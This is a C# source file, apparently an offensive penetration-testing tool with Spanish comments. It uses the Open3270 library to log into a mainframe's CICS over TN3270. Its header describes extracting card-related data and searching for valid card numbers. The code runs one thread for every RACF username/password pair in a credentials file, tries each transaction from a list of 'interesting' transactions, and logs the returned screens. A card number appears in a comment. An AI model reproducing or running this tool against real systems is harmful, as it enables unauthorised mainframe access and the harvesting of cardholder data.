using System;
using System.IO;
using Open3270;
using System.Threading;

/*
Author:David Velázquez Cruz
Descripción: Esta herramienta tiene por objetivo extraer toda la información de [REDACTED] a partir de un número de tarjeta.
Es importante notar que ha sido modificada con el fin de buscar números de tarjetas válidos y extraer los datos devueltos guardandolos
en un archivo TXT utilizado como logs y en un archivo csv para mejor manejo de la informacion.

nota: Importar el código en visual studio y e instalar Open3270 para su funcionamiento. Adicionalmente, la aplicacion utiliza credenciales
válidas de un usuario con acceso a CICS para obtener la informacion. 
*/
namespace hackGibson
{
	class Program
	{
		static void Main(string[] args)
		{
			StreamReader archivo = new StreamReader(@"credencialesRACF.txt");
			string line = "";

			while ((line = archivo.ReadLine()) != null)
			{
				Thread hilo = new Thread(enumerar);
				hilo.Start( line.Replace("\n", "").Replace(" ", "") );
				
			}
		}

		public static void enumerar(Object creds)
		{
			string credenciales= creds.ToString();
			string [] acceso= credenciales.Split("::");//0 - usuario, 1 - contraseña
			//Console.WriteLine("enumerando transacciones del usuario {0} con contraseña {1}",acceso[0],acceso[1]);

			
			 const string host = "hostnamedelmainframe";//hostname del mainframe(en este caso como no lo sabemos colocamos la IP)
			const string localIP = "IPmainframe";//ip del mainframe
			const int port = 23;//puerto del servicio TN3270 al cual conectar
			const int delayTime = 5000;//tiempo de espera para la respuesta de los comandos ejecutados
			Open3270.TNEmulator emulator = null;//inicializacion del Objeto emulador
			//long numTar = 4772133000002774;//Número de tarjeta
			StreamReader archivo = new StreamReader(@"TransaccionesInteresantes.txt");
			string line = "";
			string transaccion = "";
			StreamWriter logs;
			string datos = "";

			while ((line = archivo.ReadLine()) != null)
			{
				transaccion = line.Replace("\n","").Replace(" ","");
				Console.WriteLine("Validando {0} para el usuario {1}", transaccion,acceso[0]);
				try
				{
					
					
					emulator = new TNEmulator();
					emulator.Debug = true;
					try
					{
						if (emulator.IsConnected)
						{
							Console.Write("Connection already open, closing...");
							emulator.Close();
						}
						else
						{
							emulator.Connect(localIP, port, null);
						}
					}
					catch (Exception e)
					{
						Console.Write(e);
					}


					if (emulator.IsConnected)
					{

						
						emulator.SetText("A");
						emulator.SendKey(true, TnKey.Enter, delayTime);
						
						emulator.Refresh(true, 3000); //CLEAR key
						emulator.SendKey(true, TnKey.Clear, delayTime);
						
						emulator.SetText("CESN");
						emulator.SendKey(true, TnKey.Enter, delayTime);
					
						emulator.SetText(acceso[0]);
						emulator.SendKey(true, TnKey.Enter, delayTime);
					
						emulator.SetText(acceso[1]);
						emulator.SendKey(true, TnKey.Enter, delayTime);
						emulator.SendKey(true, TnKey.Clear, delayTime);

						Console.WriteLine("Checando si existe " + transaccion);
						emulator.SetText(transaccion);//transaccion de consulta por # de tarjeta
						emulator.SendKey(true, TnKey.Enter, delayTime);
						emulator.WaitTillKeyboardUnlocked(2000);
						datos = emulator.GetText(0, 0, 3000);

						ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
						locker.EnterWriteLock();
						
						logs = new StreamWriter(@"enumeracionDeTransaccionesUsuariosRACF.txt", true);
						logs.WriteLine("{0} - {1}",acceso[0], datos);
						logs.Close();
						
						locker.ExitWriteLock();

						emulator.Close();//cierra la sesion con el mainframe
					}
				}
				catch (Exception e)
				{
					Console.Write(e);
				}

			}//fin while
			 
		}
	}
}
